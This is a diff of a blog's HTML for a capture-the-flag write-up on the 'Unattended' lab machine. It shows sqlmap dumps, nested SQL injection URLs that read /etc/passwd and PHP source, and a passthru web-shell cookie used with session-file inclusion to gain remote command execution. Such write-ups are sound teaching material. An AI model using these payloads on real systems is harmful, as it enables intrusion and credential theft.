@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.38.2" />
+<meta name="generator" content="Hugo 0.78.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -155,7 +155,7 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "@type": "BlogPosting",
     "mainEntityOfPage":{
       "@type":"WebPage",
-      "@id":"https://alamot.github.io/"
+      "@id":"https:\/\/alamot.github.io\/"
     },
     "headline": "Unattended write-up |  ",
     "image": {
@@ -169,14 +169,14 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
-      "image": "https://alamot.github.io/images/logo.png"
+      "image": "https:\/\/alamot.github.io\/images/logo.png"
     },
     "publisher": {
       "@type": "Organization",
       "name": "",
       "logo": {
         "@type": "ImageObject",
-        "url": "https://alamot.github.io/images/logo.png",
+        "url": "https:\/\/alamot.github.io\/images/logo.png",
         "height": 60,
         "width": 60
       }
@@ -313,7 +313,7 @@ if (language) {
 
 <p>Let&rsquo;s scan the full range of TCP and UDP ports using my tool <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">htbscan.py</a></p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.126
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.126
 
 Running command: sudo masscan -e tun0 -p1-65535,U:1-65535 --max-rate 500 --interactive 10.10.10.126
 
@@ -341,18 +341,15 @@ PORT    STATE SERVICE  VERSION
 |_Not valid after:  2021-09-13T09:43:58
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 Aggressive OS guesses: Linux 3.10 - 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 - 4.6 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Linux 4.8 (91%)
-No exact OS matches for host (test conditions non-ideal).</code></pre></div></div>
+No exact OS matches for host (test conditions non-ideal).</code></pre></div>
 
 <p>We observe that port 80 redirects to <a href="https://www.nestedflanders.htb" target="_blank">https://www.nestedflanders.htb</a> and the commonName of the SSL certificate is also the same. Therefore, we add the following line in our /etc/hosts file:</p>
-
-<pre><code>10.10.10.126 www.nestedflanders.htb
-</code></pre>
-
+<pre><code>10.10.10.126 www.nestedflanders.htb</code></pre>
 <h2 id="brute-forcing-directories-and-files">Brute-forcing directories and files</h2>
 
 <p>Now, let&rsquo;s brute-force directories and files using gobuster:</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ gobuster -k -u https://www.nestedflanders.htb -w /opt/DirBuster/directory-list-2.3-medium.txt -t 20 -x php
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ gobuster -k -u https://www.nestedflanders.htb -w /opt/DirBuster/directory-list-2.3-medium.txt -t 20 -x php
 
 =====================================================
 Gobuster v2.0.1              OJ Reeves (@TheColonial)
@@ -368,7 +365,7 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 2019/04/30 01:20:35 Starting gobuster
 =====================================================
 /index.php (Status: 200)
-/dev (Status: 301)</code></pre></div></div>
+/dev (Status: 301)</code></pre></div>
 
 <h1 id="exploitation">Exploitation</h1>
 
@@ -378,7 +375,7 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-2&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?id=25&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;maifreim&#34;</span><span class="p">&gt;</span>main<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-2&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?id=465&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;maifreim&#34;</span><span class="p">&gt;</span>about<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-2&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?id=587&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;maifreim&#34;</span><span class="p">&gt;</span>contact<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span></code></pre></div></p>
 
 <p>Let&rsquo;s run sqlmap to test for SQL injections:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10
 
 ...
 [18:49:08] [INFO] GET parameter &#39;id&#39; appears to be &#39;AND boolean-based blind - WHERE or HAVING clause&#39; injectable (with --string=&#34;Feel&#34;)
@@ -397,17 +394,17 @@ Parameter: id (GET)
     Payload: id=465&#39; AND (SELECT 2816 FROM (SELECT(SLEEP(5)))iVnX)-- orQO
 ---
 [18:51:13] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL &gt;= 5.0.12</code></pre></div></div></p>
+back-end DBMS: MySQL &gt;= 5.0.12</code></pre></div></p>
 
 <p>Let&rsquo;s see what databases we have:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 --dbs
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 --dbs
 
 available databases [2]:
 [*] information_schema
-[*] neddy</code></pre></div></div></p>
+[*] neddy</code></pre></div></p>
 
 <p>Let&rsquo;s see what tables the database &lsquo;neddy&rsquo; have:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 -D neddy --tables
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 -D neddy --tables
 
 Database: neddy
 [11 tables]
@@ -423,10 +420,10 @@ Database: neddy
 | payments     |
 | productlines |
 | products     |
-+--------------+</code></pre></div></div></p>
++--------------+</code></pre></div></p>
 
 <p>Well, three databases look very promising (&lsquo;config&rsquo;, &lsquo;filepath&rsquo;, &lsquo;idname&rsquo;). Let&rsquo;s dump and examine them:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 -D neddy -T config --dump
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 -D neddy -T config --dump
 
 Database: neddy
 Table: config
@@ -486,10 +483,9 @@ Table: config
 | 103 | feed_limit              | 10                                           |
 | 104 | lifetime                | 1                                            |
 | 105 | session_handler         | file                                         |
-+-----+-------------------------+----------------------------------------------+
++-----+-------------------------+----------------------------------------------+</code></pre></div></p>
 
-
-$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 -D neddy -T filepath --dump
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 -D neddy -T filepath --dump
 
 Database: neddy
 Table: filepath
@@ -500,10 +496,9 @@ Table: filepath
 | about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |
 | contact | 0f710bba8d16303a415266af8bb52fcb.php |
 | main    | 787c75233b93aa5e45c3f85d130bfbe7.php |
-+---------+--------------------------------------+
++---------+--------------------------------------+</code></pre></div>
 
-
-$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 -D neddy -T idname --dump
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 -D neddy -T idname --dump
 Database: neddy
 Table: idname
 [6 entries]
@@ -516,7 +511,7 @@ Table: idname
 | 25  | main        | 0        |
 | 465 | about       | 0        |
 | 587 | contact     | 0        |
-+-----+-------------+----------+</code></pre></div></div></p>
++-----+-------------+----------+</code></pre></div>
 
 <p>What do we have here?</p>
 
@@ -530,11 +525,8 @@ php files defined in the column &lsquo;path&rsquo; of the table &lsquo;filepath&
 <p>Indeed if we hit, for example, this url <a href="https://www.nestedflanders.htb/47c1ba4f7b1edf28ea0e2bb250717093.php" target="_blank">https://www.nestedflanders.htb/47c1ba4f7b1edf28ea0e2bb250717093.php</a> we confirm
 that we get the &lsquo;about&rsquo; page. In other words, we must have a query, similar to this,
 running on the backend:</p>
-
 <pre><code>SELECT path FROM neddy.filepath WHERE name=(SELECT name FROM neddy.idname WHERE
-id='587')
-</code></pre>
-
+id=&#39;587&#39;)</code></pre>
 <p>Note the nested query (also known as inner query or subquery). Now, what if
 there is another SQL injection in the outer query? Could we exploit it using a
 nested SQL injection in the inner query? Let&rsquo;s find out.</p>
@@ -543,32 +535,20 @@ nested SQL injection in the inner query? Let&rsquo;s find out.</p>
 
 <p>First, let&rsquo;s explore again the initial SQL injection, manually this time.
 If we use &lsquo;ORDER BY 1&rsquo;, we get the contact page normally:</p>
-
-<pre><code>https://www.nestedflanders.htb/index.php?id=587' ORDER BY 1 --+
-</code></pre>
-
+<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; ORDER BY 1 --+</code></pre>
 <p>But if we use &lsquo;ORDER BY 2&rsquo;, the query results in error and the default index page is showed to us:</p>
-
-<pre><code>https://www.nestedflanders.htb/index.php?id=587' ORDER BY 2 --+
-</code></pre>
-
+<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; ORDER BY 2 --+</code></pre>
 <p>Now, let&rsquo;s get things interesting. The inner query should return a name like
 &lsquo;contact&rsquo;. What if we replace &lsquo;contact&rsquo; with &lsquo;about&rsquo;:</p>
-
-<pre><code>https://www.nestedflanders.htb/index.php?id=587' UNION SELECT &quot;about&quot; --+
-</code></pre>
-
+<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#34; --+</code></pre>
 <p>It worked! We got the about page instead of the contact page.</p>
 
 <p>The outer query should return the path of the php file to be loaded. Let&rsquo;s try
 the same trick. We have to nest our 2nd SQL injection <code>(about' UNION SELECT
 '/etc/passwd' --+)</code> like this:</p>
+<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION SELECT &#39;/etc/passwd&#39; --+&#34; --+
 
-<pre><code>https://www.nestedflanders.htb/index.php?id=587' UNION SELECT &quot;about' UNION SELECT '/etc/passwd' --+&quot; --+
-
-root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/bin/bash backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false messagebus:x:105:109::/var/run/dbus:/bin/false sshd:x:106:65534::/run/sshd:/usr/sbin/nologin guly:x:1000:1000:guly,,,:/home/guly:/bin/bash mysql:x:107:112:MySQL Server,,,:/nonexistent:/bin/false
-</code></pre>
-
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/bin/bash backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false messagebus:x:105:109::/var/run/dbus:/bin/false sshd:x:106:65534::/run/sshd:/usr/sbin/nologin guly:x:1000:1000:guly,,,:/home/guly:/bin/bash mysql:x:107:112:MySQL Server,,,:/nonexistent:/bin/false</code></pre>
 <p>Hooray, hooray, it&rsquo;s a holiday!</p>
 
 <p>It&rsquo;s high time to read some source code. If we
@@ -576,17 +556,14 @@ want to see the source code of php files, we have to use some kind of filter
 conversion (e.g. <code>php://filter/read=convert.base64-encode/resource=</code>) because,
 otherwise, it will load/run the php files. Let&rsquo;s
 try to read /var/www/html/index.php:</p>
+<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION
+SELECT &#39;php://filter/read=convert.base64-encode/resource=/var/www/html/index.php&#39; --+&#34; --+
 
-<pre><code>https://www.nestedflanders.htb/index.php?id=587' UNION SELECT &quot;about' UNION
-SELECT 'php://filter/read=convert.base64-encode/resource=/var/www/html/index.php' --+&quot; --+
-
-PD9waHAKJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gIm5lc3RlZGZsYW5kZXJzIjsKJHBhc3N3b3JkID0gIjEwMzY5MTNjZjdkMzhkNGVhNGY3OWIwNTBmMTcxZTlmYmYzZjVlIjsKJGRiID0gIm5lZGR5IjsKJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGRiKTsKJGRlYnVnID0gRmFsc2U7CgppbmNsdWRlICI2ZmIxNzgxN2VmYjQxMzFhZTRhZTFhY2FlMGY3ZmQ0OC5waHAiOwoKZnVuY3Rpb24gZ2V0VHBsRnJvbUlEKCRjb25uKSB7CglnbG9iYWwgJGRlYnVnOwoJJHZhbGlkX2lkcyA9IGFycmF5ICgyNSw0NjUsNTg3KTsKCWlmICggKGFycmF5X2tleV9leGlzdHMoJ2lkJywgJF9HRVQpKSAmJiAoaW50dmFsKCRfR0VUWydpZCddKSA9PSAkX0dFVFsnaWQnXSkgJiYgKGluX2FycmF5KGludHZhbCgkX0dFVFsnaWQnXSksJHZhbGlkX2lkcykpICkgewoJCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJyIuJF9HRVRbJ2lkJ10uIiciOwoJfSBlbHNlIHsKCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJzI1JyI7Cgl9CglpZiAoJGRlYnVnKSB7IGVjaG8gInNxbHRwbDogJHNxbDxicj5cbiI7IH0gCgkKCSRyZXN1bHQgPSAkY29ubi0
-</code></pre>
-
+PD9waHAKJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gIm5lc3RlZGZsYW5kZXJzIjsKJHBhc3N3b3JkID0gIjEwMzY5MTNjZjdkMzhkNGVhNGY3OWIwNTBmMTcxZTlmYmYzZjVlIjsKJGRiID0gIm5lZGR5IjsKJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGRiKTsKJGRlYnVnID0gRmFsc2U7CgppbmNsdWRlICI2ZmIxNzgxN2VmYjQxMzFhZTRhZTFhY2FlMGY3ZmQ0OC5waHAiOwoKZnVuY3Rpb24gZ2V0VHBsRnJvbUlEKCRjb25uKSB7CglnbG9iYWwgJGRlYnVnOwoJJHZhbGlkX2lkcyA9IGFycmF5ICgyNSw0NjUsNTg3KTsKCWlmICggKGFycmF5X2tleV9leGlzdHMoJ2lkJywgJF9HRVQpKSAmJiAoaW50dmFsKCRfR0VUWydpZCddKSA9PSAkX0dFVFsnaWQnXSkgJiYgKGluX2FycmF5KGludHZhbCgkX0dFVFsnaWQnXSksJHZhbGlkX2lkcykpICkgewoJCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJyIuJF9HRVRbJ2lkJ10uIiciOwoJfSBlbHNlIHsKCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJzI1JyI7Cgl9CglpZiAoJGRlYnVnKSB7IGVjaG8gInNxbHRwbDogJHNxbDxicj5cbiI7IH0gCgkKCSRyZXN1bHQgPSAkY29ubi0</code></pre>
 <p><p></p>
 Let&rsquo;s decode it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ echo PD9waHAKJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gIm5lc3RlZGZsYW5kZXJzIjsKJHBhc3N3b3JkID0gIjEwMzY5MTNjZjdkMzhkNGVhNGY3OWIwNTBmMTcxZTlmYmYzZjVlIjsKJGRiID0gIm5lZGR5IjsKJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGRiKTsKJGRlYnVnID0gRmFsc2U7CgppbmNsdWRlICI2ZmIxNzgxN2VmYjQxMzFhZTRhZTFhY2FlMGY3ZmQ0OC5waHAiOwoKZnVuY3Rpb24gZ2V0VHBsRnJvbUlEKCRjb25uKSB7CglnbG9iYWwgJGRlYnVnOwoJJHZhbGlkX2lkcyA9IGFycmF5ICgyNSw0NjUsNTg3KTsKCWlmICggKGFycmF5X2tleV9leGlzdHMoJ2lkJywgJF9HRVQpKSAmJiAoaW50dmFsKCRfR0VUWydpZCddKSA9PSAkX0dFVFsnaWQnXSkgJiYgKGluX2FycmF5KGludHZhbCgkX0dFVFsnaWQnXSksJHZhbGlkX2lkcykpICkgewoJCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJyIuJF9HRVRbJ2lkJ10uIiciOwoJfSBlbHNlIHsKCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJzI1JyI7Cgl9CglpZiAoJGRlYnVnKSB7IGVjaG8gInNxbHRwbDogJHNxbDxicj5cbiI7IH0gCgkKCSRyZXN1bHQgPSAkY29ubi0 | base64 -d</code></pre></div></div>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ echo PD9waHAKJHNlcnZlcm5hbWUgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gIm5lc3RlZGZsYW5kZXJzIjsKJHBhc3N3b3JkID0gIjEwMzY5MTNjZjdkMzhkNGVhNGY3OWIwNTBmMTcxZTlmYmYzZjVlIjsKJGRiID0gIm5lZGR5IjsKJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGRiKTsKJGRlYnVnID0gRmFsc2U7CgppbmNsdWRlICI2ZmIxNzgxN2VmYjQxMzFhZTRhZTFhY2FlMGY3ZmQ0OC5waHAiOwoKZnVuY3Rpb24gZ2V0VHBsRnJvbUlEKCRjb25uKSB7CglnbG9iYWwgJGRlYnVnOwoJJHZhbGlkX2lkcyA9IGFycmF5ICgyNSw0NjUsNTg3KTsKCWlmICggKGFycmF5X2tleV9leGlzdHMoJ2lkJywgJF9HRVQpKSAmJiAoaW50dmFsKCRfR0VUWydpZCddKSA9PSAkX0dFVFsnaWQnXSkgJiYgKGluX2FycmF5KGludHZhbCgkX0dFVFsnaWQnXSksJHZhbGlkX2lkcykpICkgewoJCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJyIuJF9HRVRbJ2lkJ10uIiciOwoJfSBlbHNlIHsKCQkkc3FsID0gIlNFTEVDVCBuYW1lIEZST00gaWRuYW1lIHdoZXJlIGlkID0gJzI1JyI7Cgl9CglpZiAoJGRlYnVnKSB7IGVjaG8gInNxbHRwbDogJHNxbDxicj5cbiI7IH0gCgkKCSRyZXN1bHQgPSAkY29ubi0 | base64 -d</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nv">$servername</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span><span class="p">;</span>
 <span class="nv">$username</span> <span class="o">=</span> <span class="s2">&#34;nestedflanders&#34;</span><span class="p">;</span>
 <span class="nv">$password</span> <span class="o">=</span> <span class="s2">&#34;1036913cf7d38d4ea4f79b050f171e9fbf3f5e&#34;</span><span class="p">;</span>
@@ -616,17 +593,14 @@ Let&rsquo;s decode it:
 <p>But what about this strange
 included file &lsquo;6fb17817efb4131ae4ae1acae0f7fd48.php&rsquo;? Let&rsquo;s read the source
 code from it too:</p>
+<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION
+SELECT &#39;php://filter/read=convert.base64-encode/resource=/var/www/html/6fb17817efb4131ae4ae1acae0f7fd48.php&#39; --+&#34; --+
 
-<pre><code>https://www.nestedflanders.htb/index.php?id=587' UNION SELECT &quot;about' UNION
-SELECT 'php://filter/read=convert.base64-encode/resource=/var/www/html/6fb17817efb4131ae4ae1acae0f7fd48.php' --+&quot; --+
-
-PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9TRVNTSU9OWyd1c2VyX25hbWUnXSkpewoJJHVzZXJfbmFtZSA9ICRfU0VTU0lPTlsndXNlcl9uYW1lJ107Cn0KCmZvcmVhY2ggKCRfQ09PS0lFIGFzICRrZXkgPT4gJHZhbCkgewoJJF9TRVNTSU9OWyRrZXldID0gJHZhbDsKfQoKLyogcmVtb3ZlZCBldmVyeXRoaW5nIGJlY2F1c2Ugb2YgdW5kZXJnb2luZyBpbnZlc3RpZ2F0aW9uLCBwbGVhc2UgY2hlY2sgZGV2IGFuZCBzdGFnaW5nICovCg==
-</code></pre>
-
+PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9TRVNTSU9OWyd1c2VyX25hbWUnXSkpewoJJHVzZXJfbmFtZSA9ICRfU0VTU0lPTlsndXNlcl9uYW1lJ107Cn0KCmZvcmVhY2ggKCRfQ09PS0lFIGFzICRrZXkgPT4gJHZhbCkgewoJJF9TRVNTSU9OWyRrZXldID0gJHZhbDsKfQoKLyogcmVtb3ZlZCBldmVyeXRoaW5nIGJlY2F1c2Ugb2YgdW5kZXJnb2luZyBpbnZlc3RpZ2F0aW9uLCBwbGVhc2UgY2hlY2sgZGV2IGFuZCBzdGFnaW5nICovCg==</code></pre>
 <p><p></p>
 Let&rsquo;s decode it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ echo PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9TRVNTSU9OWyd1c2VyX25hbWUnXSkpewoJJHVzZXJfbmFtZSA9ICRfU0VTU0lPTlsndXNlcl9uYW1lJ107Cn0KCmZvcmVhY2ggKCRfQ09PS0lFIGFzICRrZXkgPT4gJHZhbCkgewoJJF9TRVNTSU9OWyRrZXldID0gJHZhbDsKfQoKLyogcmVtb3ZlZCBldmVyeXRoaW5nIGJlY2F1c2Ugb2YgdW5kZXJnb2luZyBpbnZlc3RpZ2F0aW9uLCBwbGVhc2UgY2hlY2sgZGV2IGFuZCBzdGFnaW5nICovCg== | base64 -d</code></pre></div></div>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ echo PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9TRVNTSU9OWyd1c2VyX25hbWUnXSkpewoJJHVzZXJfbmFtZSA9ICRfU0VTU0lPTlsndXNlcl9uYW1lJ107Cn0KCmZvcmVhY2ggKCRfQ09PS0lFIGFzICRrZXkgPT4gJHZhbCkgewoJJF9TRVNTSU9OWyRrZXldID0gJHZhbDsKfQoKLyogcmVtb3ZlZCBldmVyeXRoaW5nIGJlY2F1c2Ugb2YgdW5kZXJnb2luZyBpbnZlc3RpZ2F0aW9uLCBwbGVhc2UgY2hlY2sgZGV2IGFuZCBzdGFnaW5nICovCg== | base64 -d</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nx">session_start</span><span class="p">();</span>
 <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user_name&#39;</span><span class="p">])){</span>
 	<span class="nv">$user_name</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user_name&#39;</span><span class="p">];</span>
@@ -644,27 +618,18 @@ Let&rsquo;s decode it:
 <p>Therefore, we can either read the php.ini file to learn this location or brute-force well known paths of PHP session storage. I did the latter and I discovered that indeed the sessions were stored in /var/lib/php/sessions/.</p>
 
 <p>Now, we can set a cookie with a value <code>&quot;&lt;?php passthru($_REQUEST['cmd'])?&gt;&quot;</code> and this will be stored inside a file at <code>/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</code>. Then all we have to do is to include/run this file using our nested SQL injection technique:</p>
+<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION SELECT &#39;/var/lib/php/sessions/sess_d0rosoogt4afnin1qtic4ju612&#39; --+&#34; --+&amp;cmd=whoami
 
-<pre><code>https://www.nestedflanders.htb/index.php?id=587' UNION SELECT &quot;about' UNION SELECT '/var/lib/php/sessions/sess_d0rosoogt4afnin1qtic4ju612' --+&quot; --+&amp;cmd=whoami
-
-PHPSESSID|s:26:&quot;d0rosoogt4afnin1qtic4ju612&quot;;test|s:32:&quot;www-data &quot;;
-</code></pre>
-
+PHPSESSID|s:26:&#34;d0rosoogt4afnin1qtic4ju612&#34;;test|s:32:&#34;www-data &#34;;</code></pre>
 <p>We achieved remote command execution!</p>
 
 <p><p></p>
 To get a full shell you can try payloads like those (url-encoded them to make your life easier):</p>
-
